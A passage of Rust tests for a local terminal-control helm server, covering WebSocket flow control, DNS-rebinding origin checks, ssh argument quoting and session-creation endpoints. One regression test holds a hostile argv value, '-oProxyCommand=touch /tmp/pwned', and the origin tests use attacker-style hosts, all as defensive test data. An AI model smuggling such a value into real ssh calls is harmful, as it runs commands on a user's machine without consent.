            self.buffered.drain(..header + len);
            Some((opcode, payload))
        }
    }

    /// Browser pause/resume must reach the SUPERVISOR as
    /// `PauseOutput`/`ResumeOutput` for this terminal's channel.
    ///
    /// The WS half of PLAN_M2_5.md's watermark flow control had no
    /// coverage at all: only `SupervisorClient`'s methods were tested, so
    /// nothing pinned the JSON message shapes, the routing from a text
    /// frame to the right channel, or that the helm forwards rather than
    /// interpreting. Any of those silently breaking would leave the
    /// browser's watermark wired to nothing — a failure whose only symptom
    /// is memory growth under load.
    #[tokio::test]
    async fn browser_pause_and_resume_reach_the_supervisor_for_this_channel() {
        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(scripted_supervisor_attach(peer_side));
        let mut harness = rest_harness::spliced_helm(client_side).await;
        let addr = harness.serve().await;
        // Concurrently, and this ordering is not incidental: the scripted
        // peer only ever sees an `Attach` because a browser connected, so
        // awaiting it first would be waiting on something this test has
        // not caused yet.
        let (mut ws, peer) = tokio::join!(
            WsTestClient::connect(addr, "/api/sessions/sess-1/term"),
            peer
        );
        let (mut reader, _writer, channel) = peer.unwrap();

        ws.send_text(r#"{"type":"pause"}"#).await;
        ws.send_text(r#"{"type":"resume"}"#).await;

        for expected in [
            ControlMsg::PauseOutput { channel },
            ControlMsg::ResumeOutput { channel },
        ] {
            let frame = tokio::time::timeout(Duration::from_secs(5), reader.read_frame())
                .await
                .expect("the supervisor never saw the browser's flow-control message")
                .unwrap()
                .expect("connection closed");
            let got = farhelm_proto::io::parse_control(&frame).unwrap();
            assert_eq!(
                format!("{got:?}"),
                format!("{expected:?}"),
                "the browser's message must reach the supervisor unchanged, for its own channel"
            );
        }
    }

    /// For a completed initial attach catch-up, the marker's ordering
    /// property is: it must reach the browser AFTER the binary replay
    /// bytes it describes and BEFORE any binary live byte, on the exact
    /// same socket (PLAN_M5.md item 4) — not the marker's whole contract,
    /// which also covers attaches a takeover/detach/stall ends before a
    /// marker is owed, and the markerless `%pause` recovery replay (see
    /// `TermEvent::ReplayComplete`'s own docs); neither is this test's
    /// concern. This is the real-socket complement to
    /// `client::tests::replay_complete_marker_is_ordered_between_replay_and_live_data_in_the_queue`
    /// — that test pins the ordering inside `SupervisorClient`'s queue;
    /// this one pins that `serve_term`'s WS forwarding does not reorder or
    /// drop the marker on the way to a real `WsTestClient`, and that it
    /// arrives as the documented `{"type":"replay_complete"}` text frame
    /// rather than, say, folded into the binary stream.
    #[tokio::test]
    async fn term_ws_delivers_the_replay_complete_marker_between_replay_and_live_bytes() {
        use farhelm_proto::ControlMsg;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(scripted_supervisor_attach(peer_side));
        let mut harness = rest_harness::spliced_helm(client_side).await;
        let addr = harness.serve().await;
        let (mut ws, peer) = tokio::join!(
            WsTestClient::connect(addr, "/api/sessions/sess-1/term"),
            peer
        );
        let (_reader, mut writer, channel) = peer.unwrap();

        writer
            .write_frame(&farhelm_proto::Frame::data(channel, b"replay".to_vec()))
            .await
            .unwrap();
        writer
            .write_control(&ControlMsg::ReplayComplete { channel })
            .await
            .unwrap();
        writer
            .write_frame(&farhelm_proto::Frame::data(channel, b"live".to_vec()))
            .await
            .unwrap();

        let (opcode, payload) = tokio::time::timeout(Duration::from_secs(5), ws.recv())
            .await
            .expect("no replay data arrived")
            .expect("socket closed before the replay data");
        assert_eq!(opcode, 2, "replay bytes are a binary frame");
        assert_eq!(payload, b"replay");

        let (opcode, payload) = tokio::time::timeout(Duration::from_secs(5), ws.recv())
            .await
            .expect("no replay-complete marker arrived")
            .expect("socket closed before the marker");
        assert_eq!(opcode, 1, "the marker is a text frame");
        let notice: serde_json::Value = serde_json::from_slice(&payload).unwrap();
        assert_eq!(
            notice,
            serde_json::json!({"type": "replay_complete"}),
            "the marker must be exactly this fixed object — no stray fields (a channel, say, \
             which the socket has no need to name since it IS the channel) and no missing ones"
        );

        let (opcode, payload) = tokio::time::timeout(Duration::from_secs(5), ws.recv())
            .await
            .expect("no live data arrived")
            .expect("socket closed before the live data");
        assert_eq!(opcode, 2, "live bytes are a binary frame");
        assert_eq!(
            payload, b"live",
            "live output must follow the marker, not race ahead of it"
        );
    }

    /// A browser that stops reading must not pin the WebSocket handler:
    /// the stall detach has to terminate it even while a send to that
    /// browser is blocked.
    ///
    /// This is the teardown half of the detach-not-block design, and
    /// until now it was only argued. The failure it guards is specific
    /// and quiet: `serve_term` parked in `ws_tx.send()` to a browser that
    /// stopped reading cannot observe a detach that arrives through the
    /// terminal's data queue, because that queue is full — which is
    /// precisely why the terminal was detached. Handler, socket, queued
    /// frames, and the notification task would then stay alive for as
    /// long as the wedge lasted, which is exactly the unbounded pin the
    /// stall detach exists to end.
    ///
    /// The assertion is the strongest one available from outside: the
    /// server CLOSES the connection. That can only happen after
    /// `serve_term` returned, which can only happen after the blocked send
    /// was abandoned — so a regression that restores the in-band-only
    /// detach hangs here instead of passing.
    #[tokio::test]
    async fn a_wedged_browser_is_torn_down_by_the_stall_detach() {
        let (client_side, peer_side) = tokio::io::duplex(1024 * 1024);
        let peer = tokio::spawn(scripted_supervisor_attach(peer_side));
        let mut harness = rest_harness::spliced_helm(client_side).await;
        let addr = harness.serve().await;
        // Concurrently, for the same reason as the test above.
        let (mut ws, peer) = tokio::join!(
            WsTestClient::connect(addr, "/api/sessions/sess-1/term"),
            peer
        );
        let (_reader, mut writer, channel) = peer.unwrap();

        // Read exactly one frame, proving the socket works, and then stop
        // reading forever — the wedged browser.
        writer
            .write_frame(&Frame::data(channel, b"first".to_vec()))
            .await
            .unwrap();
        let (opcode, payload) = tokio::time::timeout(Duration::from_secs(5), ws.recv())
            .await
            .expect("no first frame")
            .expect("socket closed early");
        assert_eq!((opcode, payload.as_slice()), (2, &b"first"[..]));

        // Flood until the kernel buffers, the WS sink, and the helm's
        // per-terminal queue are all full, so `serve_term` is genuinely
        // parked mid-send rather than idle.
        for _ in 0..2_000 {
            if writer
                .write_frame(&Frame::data(channel, vec![b'x'; 4096]))
                .await
                .is_err()
            {
                break;
            }
        }

        // The supervisor detaches it as stalled. This must tear the
        // handler down even though the send above cannot complete.
        writer
            .write_control(&ControlMsg::Detached {
                channel,
                reason: farhelm_proto::DETACH_REASON_STALLED.to_string(),
            })
            .await
            .unwrap();

        // Drain to EOF: the server must close. Whatever backlog is still
        // in flight is fine to receive — the contract is that the
        // connection ENDS, not that the backlog is discarded byte for
        // byte.
        let closed = tokio::time::timeout(Duration::from_secs(20), async {
            while ws.recv().await.is_some() {}
        })
        .await;
        assert!(
            closed.is_ok(),
            "the terminal WebSocket never closed after a stall detach — `serve_term` is still \
             pinned on a send to a browser that stopped reading"
        );
    }

    /// Drive a scripted supervisor peer through an attach, returning the
    /// reader/writer halves positioned right after the `Attached` reply.
    ///
    /// Every WebSocket test below needs the same preamble — handshake,
    /// answer one `Attach` — and none of them is about that preamble.
    async fn scripted_supervisor_attach(
        peer_side: tokio::io::DuplexStream,
    ) -> (
        FrameReader<tokio::io::ReadHalf<tokio::io::DuplexStream>>,
        FrameWriter<tokio::io::WriteHalf<tokio::io::DuplexStream>>,
        u32,
    ) {
        let (r, w) = tokio::io::split(peer_side);
        let mut reader = FrameReader::new(r);
        let mut writer = FrameWriter::new(w);
        handshake(&mut reader, &mut writer, "supervisor")
            .await
            .unwrap();
        let request =
            farhelm_proto::io::parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
        let ControlMsg::Attach {
            req_id, channel, ..
        } = request
        else {
            panic!("expected an Attach, got {request:?}");
        };
        writer
            .write_control(&ControlMsg::Attached { req_id, channel })
            .await
            .unwrap();
        (reader, writer, channel)
    }

    const PORT: u16 = 7433;

    /// A `#[derive(Parser)]` shim purely so this test can call
    /// `try_parse_from` — `HelmArgs` itself is `#[derive(Args)]`, meant to
    /// be `#[command(flatten)]`ed into the real `farhelm` CLI, and only a
    /// top-level `Parser` exposes clap's parsing entry point.
    #[derive(clap::Parser, Debug)]
    struct Wrapper {
        #[command(flatten)]
        args: crate::HelmArgs,
    }

    /// The argv session and transport flags are GONE (PLAN_M6.md item 5),
    /// and `--ensure-hosts` is what replaced the transport half.
    ///
    /// Pinned as a test rather than left to the type, because a flag that
    /// quietly came back would be worse than one that never left: a helm
    /// now drives every registered host at once, so `--ssh` could only ever
    /// name one of them, and `--cwd`/`--agent` would be a creation path
    /// that bypasses the host selection the create API exists to make
    /// explicit. clap's own grammar is the only thing that catches a
    /// reintroduction, so it is asserted here directly.
    #[test]
    fn the_dropped_argv_session_flags_are_refused_and_ensure_hosts_replaces_them() {
        use clap::Parser;

        for dropped in [
            "--ssh",
            "--cwd",
            "--agent",
            "--title",
            "--remote-farhelm",
            "--remote-state-dir",
        ] {
            let err = Wrapper::try_parse_from(["farhelm", dropped, "value"])
                .expect_err("{dropped} must no longer be a helm flag");
            assert_eq!(
                err.kind(),
                clap::error::ErrorKind::UnknownArgument,
                "{dropped} must be refused as unknown, not merely ignored"
            );
        }

        let parsed = Wrapper::try_parse_from(["farhelm", "--ensure-hosts", "/etc/farhelm.json5"])
            .expect("--ensure-hosts is the flag that replaced them");
        assert_eq!(
            parsed.args.ensure_hosts,
            Some(std::path::PathBuf::from("/etc/farhelm.json5"))
        );
    }

    fn headers(host: Option<&str>, origin: Option<&str>) -> HeaderMap {
        let mut h = HeaderMap::new();
        if let Some(host) = host {
            h.insert(axum::http::header::HOST, host.parse().unwrap());
        }
        if let Some(origin) = origin {
            h.insert(axum::http::header::ORIGIN, origin.parse().unwrap());
        }
        h
    }

    /// The full decision matrix for the DNS-rebinding defense. This
    /// check is the only thing between a hostile web page (or a spoofed
    /// Host) and keystroke-level control of a live agent, so every
    /// branch is pinned individually: each of these would pass with some
    /// plausible-but-wrong implementation (suffix matching, `null`
    /// treated as absent, Host ignored).
    #[test]
    fn loopback_hosts_with_no_or_loopback_origin_are_allowed() {
        // curl and non-browser clients: Host only, no Origin.
        assert!(origin_is_allowed(
            &headers(Some("127.0.0.1:7433"), None),
            PORT
        ));
        assert!(origin_is_allowed(
            &headers(Some("localhost:7433"), None),
            PORT
        ));
        assert!(origin_is_allowed(&headers(Some("[::1]:7433"), None), PORT));
        // The browser's own same-origin requests carry both.
        assert!(origin_is_allowed(
            &headers(Some("127.0.0.1:7433"), Some("http://127.0.0.1:7433")),
            PORT
        ));
    }

    /// The desktop webview serves the app from a custom scheme a web page
    /// cannot forge; those origins are allowed. `null` (sandboxed iframe,
    /// data: document) is deliberately NOT — loosening `None => true`
    /// into "unparseable/null is fine" would reopen the rebinding hole.
    #[test]
    fn custom_scheme_origins_are_allowed_but_null_is_not() {
        let host = Some("127.0.0.1:7433");
        assert!(origin_is_allowed(
            &headers(host, Some("dioxus://index.html")),
            PORT
        ));
        assert!(origin_is_allowed(
            &headers(host, Some("wry://localhost")),
            PORT
        ));
        assert!(!origin_is_allowed(&headers(host, Some("null")), PORT));
    }

    /// A rebinding attack presents a foreign Host (the attacker's domain
    /// resolving to 127.0.0.1) or a foreign Origin; both directions must
    /// refuse, as must a missing Host and the wrong loopback port.
    #[test]
    fn foreign_or_missing_authorities_are_refused() {
        assert!(!origin_is_allowed(&headers(None, None), PORT));
        assert!(!origin_is_allowed(
            &headers(Some("attacker.example:7433"), None),
            PORT
        ));
        assert!(!origin_is_allowed(
            &headers(Some("127.0.0.1:9999"), None),
            PORT
        ));
        assert!(!origin_is_allowed(
            &headers(Some("127.0.0.1:7433"), Some("http://evil.example")),
            PORT
        ));
        assert!(!origin_is_allowed(
            &headers(Some("127.0.0.1:7433"), Some("http://127.0.0.1:9999")),
            PORT
        ));
    }

    /// Browsers omit the scheme-default port from Host/Origin, so on
    /// `--port 80` the bare loopback authorities must be accepted — the
    /// exact-`:80` forms never arrive, and requiring them locks every
    /// browser out of a legal flag value. The bare forms stay refused on
    /// any other port (fail-closed).
    #[test]
    fn default_port_80_accepts_portless_loopback_authorities() {
        assert!(origin_is_allowed(&headers(Some("127.0.0.1"), None), 80));
        assert!(origin_is_allowed(&headers(Some("localhost"), None), 80));
        assert!(origin_is_allowed(
            &headers(Some("127.0.0.1"), Some("http://127.0.0.1")),
            80
        ));
        // Explicit :80 still works (curl sends it).
        assert!(origin_is_allowed(&headers(Some("127.0.0.1:80"), None), 80));
        // Foreign authorities are still refused on port 80...
        assert!(!origin_is_allowed(&headers(Some("evil.example"), None), 80));
        // ...and portless loopback stays refused on non-default ports.
        assert!(!origin_is_allowed(&headers(Some("127.0.0.1"), None), PORT));
    }

    /// The remote state dir rides ssh's trailing argv, which the remote
    /// login shell re-parses — a path with spaces must survive as one
    /// token. `shell_words::split` is the inverse oracle for the quoting.
    /// ssh tokenizes `-o` values like config-file lines, so a local
    /// state dir containing a space must arrive quoted — otherwise every
    /// `--ssh` connection from that state dir dies at startup.
    #[test]
    fn ssh_args_quote_a_control_path_containing_spaces() {
        let args = super::ssh_args(
            "user@host",
            std::path::Path::new("/home/u/my state/ssh-cm-%C"),
            "farhelm",
            None,
        )
        .unwrap();
        assert!(
            args.contains(&"ControlPath=\"/home/u/my state/ssh-cm-%C\"".to_string()),
            "ControlPath must be quoted for ssh's own parser: {args:?}"
        );
    }

    /// OpenSSH expands percent tokens after parsing `-o`, so a state
    /// directory containing `%d` must stay literal while Farhelm's final
    /// `%C` remains active. Quotes and backslashes exercise the separate
    /// config-tokenization layer; shell quoting would not protect them.
    #[test]
    fn ssh_args_escape_control_path_config_syntax() {
        let args = super::ssh_args(
            "user@host",
            std::path::Path::new("/home/u/%d/\"quoted\"/back\\slash/ssh-cm-%C"),
            "farhelm",
            None,
        )
        .unwrap();
        assert!(args.contains(
            &"ControlPath=\"/home/u/%%d/\\\"quoted\\\"/back\\\\slash/ssh-cm-%C\"".to_string()
        ));
    }

    /// The remote argv, as ssh will hand it to the remote login shell:
    /// everything after the option terminator AND the destination that now
    /// follows it (see [`ssh_args_terminate_options_before_the_destination`]
    /// for why the destination sits there).
    fn remote_command(args: &[String]) -> Vec<String> {
        let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
        let remote = args[dashdash + 2..].join(" ");
        shell_words::split(&remote).expect("remote command must be shell-parseable")
    }

    /// The argv-injection regression: OpenSSH parses options up to the
    /// terminator, so a destination shaped like `-oProxyCommand=...` is read
    /// as an OPTION — and `ProxyCommand` runs a LOCAL shell command — for as
    /// long as `--` sits after it. This pins the ordering that closes it:
    /// the terminator precedes the destination, and the destination is
    /// therefore always a positional argument no matter what it contains.
    ///
    /// Asserted on the argv itself rather than by running ssh, because the
    /// bug is entirely in argument order and the exploit would otherwise
    /// need a real ssh, a real shell, and an observable side effect to
    /// detect.
    #[test]
    fn ssh_args_terminate_options_before_the_destination() {
        let hostile = "-oProxyCommand=touch /tmp/pwned";
        let args = super::ssh_args(
            hostile,
            std::path::Path::new("/state/ssh-cm-%C"),
            "farhelm",
            Some("/remote/state"),
        )
        .unwrap();
        let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
        assert_eq!(
            args[dashdash + 1],
            hostile,
            "the destination must sit immediately after the option terminator: {args:?}"
        );
        assert!(
            !args[..dashdash].iter().any(|a| a == hostile),
            "no copy of the destination may precede the terminator: {args:?}"
        );
        // The remote argv the old placement was protecting must still be
        // covered: `--state-dir` is past the terminator too.
        assert_eq!(
            remote_command(&args),
            vec![
                "farhelm",
                "internal",
                "stdio",
                "--state-dir",
                "/remote/state"
            ]
        );
    }

    /// The executable is part of ssh's reconstructed remote command too,
    /// not a local argv passed directly to exec. It needs the same POSIX
    /// quoting as the remote state directory.
    #[test]
    fn ssh_args_quote_the_remote_executable_for_the_remote_shell() {
        let args = super::ssh_args(
            "user@host",
            std::path::Path::new("/state/ssh-cm-%C"),
            "/opt/far helm's/bin",
            None,
        )
        .unwrap();
        assert_eq!(
            remote_command(&args),
            vec!["/opt/far helm's/bin", "internal", "stdio"]
        );
    }

    #[test]
    fn ssh_args_quote_the_remote_state_dir_for_the_remote_shell() {
        let args = super::ssh_args(
            "user@host",
            std::path::Path::new("/state/ssh-cm-%C"),
            "farhelm",
            Some("/home/u/my state/farhelm"),
        )
        .unwrap();
        assert_eq!(
            remote_command(&args),
            vec![
                "farhelm",
                "internal",
                "stdio",
                "--state-dir",
                "/home/u/my state/farhelm"
            ]
        );
    }

    /// `ssh_args` is the enforcement point for a local ControlPath that
    /// happens to contain non-UTF-8 bytes (a stray mount, a mis-encoded
    /// filename): without the check inlined there, the path would flow
    /// into `Path::to_string_lossy` further down the ssh argv builder and
    /// get silently rewritten into a *different* path — one ssh would
    /// then create or reuse a ControlMaster socket under with no error
    /// and no hint that the path it acted on was not the one on disk.
    /// Asserting the offending path's lossy display appears in the error
    /// pins that the message tells the user WHICH path is unusable, not
    /// just that "something" was not UTF-8 — bypassing the check at the
    /// call site, or degrading the error to something generic, fails this
    /// test. A valid-UTF-8 control path (covered by the quoting tests
    /// above) must keep passing through unchanged.
    #[test]
    fn ssh_args_rejects_a_non_utf8_control_path_naming_it_in_the_error() {
        use std::ffi::OsStr;
        use std::os::unix::ffi::OsStrExt;

        let non_utf8 = std::path::Path::new(OsStr::from_bytes(b"/home/u/\xffstate/ssh-cm-%C"));
        let err = super::ssh_args("user@host", non_utf8, "farhelm", None).unwrap_err();
        let rendered = format!("{err:#}");
        assert!(
            rendered.contains(&non_utf8.to_string_lossy().into_owned()),
            "error should name the offending path so the user can see which one: {rendered}"
        );
    }

    /// Run a real [`handshake`] against a peer that writes `peer_prefix`
    /// and then closes its write direction, and return the failure as the
    /// helm's `anyhow` chain would carry it.
    ///
    /// Synthesizing an `io::Error` here instead would test nothing: the
    /// whole question these tests ask is whether the error `handshake`
    /// ACTUALLY produces is the one `annotate_ssh_handshake_eof` matches,
    /// and a hand-built stand-in would keep passing after the two drifted
    /// apart. The peer half is kept alive (to the end of this scope) and
    /// only its WRITE direction is shut down — dropping it whole would
    /// fail this side's hello write instead, and the read-side failure
    /// under test would never be reached.
    async fn handshake_failure_against(peer_prefix: &[u8]) -> anyhow::Error {
        let (a, mut b) = tokio::io::duplex(64 * 1024);
        b.write_all(peer_prefix).await.unwrap();
        b.shutdown().await.unwrap();
        let (ar, aw) = tokio::io::split(a);
        let mut r = FrameReader::new(ar);
        let mut w = FrameWriter::new(aw);
        anyhow::Error::new(handshake(&mut r, &mut w, "helm").await.unwrap_err())
    }

    /// MT-1 regression: a dead ssh proxy must not surface as a bare
    /// "connection closed before hello" with no hint that a supervisor may
    /// need starting. The annotator is exercised over a real handshake but
    /// not through `connect_supervisor`, which needs an actual `ssh` child
    /// and would cost far more for the same coverage.
    ///
    /// The message must offer BOTH live possibilities. This side cannot
    /// tell "no supervisor there" from "ssh never connected" — they arrive
    /// identically — so naming only the first would state a guess as a
    /// diagnosis and send the operator to the wrong host to fix it.
    #[tokio::test]
    async fn annotate_ssh_handshake_eof_names_host_and_remedy_on_clean_close() {
        let err = super::annotate_ssh_handshake_eof(
            handshake_failure_against(&[]).await,
            "user@host",
            None,
        );
        let rendered = format!("{err:#}");
        assert!(
            rendered.contains("user@host") && rendered.contains("farhelm supervisor run"),
            "must name the host and the fix: {rendered}"
        );
        assert!(
            rendered.contains("ssh connection itself failed"),
            "must also offer the ssh-transport possibility, not just a missing supervisor: \
             {rendered}"
        );
        assert!(
            rendered.contains("connection closed before hello"),
            "the underlying error must survive in the chain, not just the new wrapper: {rendered}"
        );
    }

    /// With `--remote-state-dir` in play, a remedy without `--state-dir`
    /// is worse than none: pasted as printed it starts a supervisor
    /// bound under the remote's DEFAULT state dir, which the proxy — told
    /// to use the given one — still will not find, so the operator
    /// "fixes" the problem and sees the identical error again.
    #[tokio::test]
    async fn annotate_ssh_handshake_eof_remedy_carries_the_remote_state_dir() {
        let err = super::annotate_ssh_handshake_eof(
            handshake_failure_against(&[]).await,
            "user@host",
            Some("/srv/my state/farhelm"),
        );
        let rendered = format!("{err:#}");
        assert!(
            rendered.contains("farhelm supervisor run --state-dir '/srv/my state/farhelm'"),
            "the remedy must be pasteable into the remote shell, quoting included: {rendered}"
        );
    }

    /// A peer that spoke half a hello and died is a DIFFERENT failure that
    /// happens to share `ErrorKind::UnexpectedEof`: something was running
    /// on that host and crashed mid-sentence. Telling that operator to
    /// start a supervisor would point them away from the real problem, so
    /// the mid-frame diagnostic must reach them unedited. Guards against
    /// the matcher regressing to a kind check.
    #[tokio::test]
    async fn annotate_ssh_handshake_eof_leaves_a_mid_frame_death_untouched() {
        let mut hello = Vec::new();
        Frame::control(&ControlMsg::hello("supervisor"))
            .encode(&mut hello)
            .unwrap();
        let raw = handshake_failure_against(&hello[..hello.len() / 2]).await;
        let before = format!("{raw:#}");
        let err = super::annotate_ssh_handshake_eof(raw, "user@host", None);
        let rendered = format!("{err:#}");
        assert_eq!(
            rendered, before,
            "a mid-frame death must pass through byte for byte"
        );
        assert!(
            rendered.contains("mid-frame") && !rendered.contains("farhelm supervisor run"),
            "the mid-frame diagnostic must survive and gain no guessed remedy: {rendered}"
        );
    }

    /// A handshake failure that is not an EOF at all (protocol mismatch, a
    /// peer that spoke garbage, ...) already carries its own specific,
    /// accurate message. Asserting the error survives IDENTICALLY — kind,
    /// message, chain depth — rather than merely lacking the remedy
    /// string: an annotator that wrapped every error in a vaguer context
    /// while only appending the remedy conditionally would pass the weaker
    /// check and still bury the real diagnosis.
    #[test]
    fn annotate_ssh_handshake_eof_leaves_other_errors_untouched() {
        let mismatch = std::io::Error::other("protocol version mismatch: peer speaks v1...");
        let err = super::annotate_ssh_handshake_eof(
            anyhow::Error::new(mismatch),
            "user@host",
            Some("/srv/state"),
        );
        assert_eq!(err.chain().count(), 1, "no context layer may be added");
        let io = err
            .downcast_ref::<std::io::Error>()
            .expect("the original io::Error must still be the error itself");
        assert_eq!(io.kind(), std::io::ErrorKind::Other);
        assert_eq!(
            io.to_string(),
            "protocol version mismatch: peer speaks v1..."
        );
    }

    /// Authority derivation must not be a suffix match: a value that
    /// merely ENDS in a loopback authority ("evil.example/127.0.0.1:7433")
    /// has to be refused. No browser sends such a value — the point is
    /// that this gate must not depend on that.
    #[test]
    fn embedded_loopback_suffixes_are_refused() {
        assert!(!origin_is_allowed(
            &headers(Some("evil.example/127.0.0.1:7433"), None),
            PORT
        ));
        assert!(!origin_is_allowed(
            &headers(
                Some("127.0.0.1:7433"),
                Some("http://evil.example/127.0.0.1:7433")
            ),
            PORT
        ));
    }

    /// `POST /api/sessions` end to end through the real axum handler and
    /// middleware stack, with a scripted supervisor peer standing in for
    /// `farhelm-supervisor`.
    ///
    /// PLAN_M1.md makes this endpoint the single creation path: every
    /// caller — the M1 CLI flags today, the M2 GUI session-creation dialog
    /// next — lands on the same API, never bypassing it. Despite that, no
    /// *successful* request previously exercised the handler: the
    /// Playwright e2e suite deliberately covers only a failure path
    /// (create in a nonexistent working directory), and the Rust e2e
    /// tests call `SupervisorClient::create_session` directly, which
    /// bypasses both the handler and the `CreateReq` struct's
    /// `#[serde(default)]` cols/rows fields entirely. That left the 80x24
    /// default — the size an agent's first output wraps to before any
    /// browser has attached and reported a real size — pinned nowhere.
    /// This test closes that gap: it omits cols/rows/title from the
    /// request body, asserts the peer received exactly the defaults, and
    /// checks the JSON reply shape a caller actually depends on.
    ///
    /// This same minimal body is also the pre-M3 caller posture for
    /// `agent_kind`/`resume_template` (PLAN_M3.md item 7): the UI and CLI
    /// currently send neither field, so this test also pins that an
    /// absent override decodes and forwards as `None` rather than
    /// inventing a value — the fields are deliberately accepted here for
    /// non-UI API callers that basename recognition cannot classify, not
    /// because every production caller is expected to omit them forever.
    #[tokio::test]
    async fn create_session_request_with_omitted_dimensions_uses_80x24_defaults() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, Frame, SessionInfo};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::CreateSession {
                req_id,
                cwd,
                invocation,
                title,
                cols,
                rows,
                agent_kind,
                resume_template,
                // Not under test here (the assertions below only check
                // cwd/invocation/title/cols/rows/agent_kind/resume_template);
                // PLAN_M3.md's `intent_key` is exercised by
                // `create_session_forwards_the_bodys_extras_to_the_supervisor`
                // instead.
                ..
            } = request
            else {
                panic!("expected CreateSession, got {request:?}");
            };
            // The contract under test: a caller that omits cols/rows must
            // still reach the supervisor with the documented 80x24
            // defaults. (Without the serde defaults the request would not
            // reach the supervisor at all — axum rejects a body missing
            // non-optional fields during deserialization.)
            assert_eq!((cols, rows), (80, 24), "serde defaults must be 80x24");
            assert_eq!(cwd, "/some/dir");
            assert_eq!(invocation, "some-agent");
            assert_eq!(title, None);
            assert_eq!(agent_kind, None);
            assert_eq!(resume_template, None);
            writer
                .write_frame(&Frame::control(&ControlMsg::SessionCreated {
                    req_id,
                    session: SessionInfo {
                        id: "sess-1".into(),
                        title: "some-agent".into(),
                        created_at: 1_700_000_000,
                        cwd: "/some/dir".into(),
                        invocation: "some-agent".into(),
                        // Matches real `create_session` output: `Unknown`,
                        // not `Alive` (creation does not establish the
                        // agent's later exec succeeded).
                        status: farhelm_proto::SessionStatus::Unknown,
                        annotation: None,
                        restart_offer: farhelm_proto::RestartOffer::default(),
                        tabs: Vec::new(),
                    },
                }))
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions")
            .header("host", "127.0.0.1:7433")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({"cwd": "/some/dir", "invocation": "some-agent"}).to_string(),
            ))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let session: SessionInfo = serde_json::from_slice(&body).unwrap();
        assert_eq!(session.id, "sess-1");
        assert_eq!(session.cwd, "/some/dir");

        peer.await.unwrap();
    }

    /// The create body's `intent_key`, `agent_kind`, and `resume_template`
    /// all reach the supervisor verbatim (PLAN_M3.md items 6 and 7).
    ///
    /// Worth its own test because the helm is a pure pass-through here and
    /// pass-throughs are exactly what silently stop passing things
    /// through: nothing else in this crate would notice if a field were
    /// dropped, and for `intent_key` specifically the symptom in production
    /// would not be an error but a SECOND session appearing on a retry —
    /// the failure the whole feature exists to prevent, visible only under
    /// a lost reply.
    #[tokio::test]
    async fn create_session_forwards_the_bodys_extras_to_the_supervisor() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{AgentKind, ControlMsg, Frame, SessionInfo};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::CreateSession {
                req_id,
                intent_key,
                agent_kind,
                resume_template,
                ..
            } = request
            else {
                panic!("expected CreateSession, got {request:?}");
            };
            assert_eq!(
                intent_key.as_deref(),
                Some("intent-from-the-browser"),
                "the key belongs to whoever can retry, so it must arrive unaltered"
            );
            assert_eq!(agent_kind, Some(AgentKind::Claude));
            assert_eq!(
                resume_template,
                Some(vec!["claude".to_string(), "{conversation}".to_string()])
            );
            writer
                .write_frame(&Frame::control(&ControlMsg::SessionCreated {
                    req_id,
                    session: SessionInfo {
                        id: "sess-1".into(),
                        title: "t".into(),
                        created_at: 1_700_000_000,
                        cwd: "/some/dir".into(),
                        invocation: "some-agent".into(),
                        status: farhelm_proto::SessionStatus::Unknown,
                        annotation: None,
                        restart_offer: farhelm_proto::RestartOffer::default(),
                        tabs: Vec::new(),
                    },
                }))
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions")
            .header("host", "127.0.0.1:7433")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({
                    "cwd": "/some/dir",
                    "invocation": "some-agent",
                    "intent_key": "intent-from-the-browser",
                    "agent_kind": "claude",
                    "resume_template": ["claude", "{conversation}"],
                })
                .to_string(),
            ))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        peer.await.unwrap();
    }

    /// `POST /api/sessions/{id}/stop` end to end: a scripted peer replies
    /// `SessionStopped`, and the route must answer 200 with an empty JSON
    /// object — the uniform success body `stop`/`delete` share so a caller
    /// does not need to special-case "no content".
    #[tokio::test]
    async fn stop_session_happy_path_returns_200_with_empty_object_body() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::StopSession { req_id, session_id } = request else {
                panic!("expected StopSession, got {request:?}");
            };
            assert_eq!(session_id, "sess-1");
            writer
                .write_control(&ControlMsg::SessionStopped { req_id })
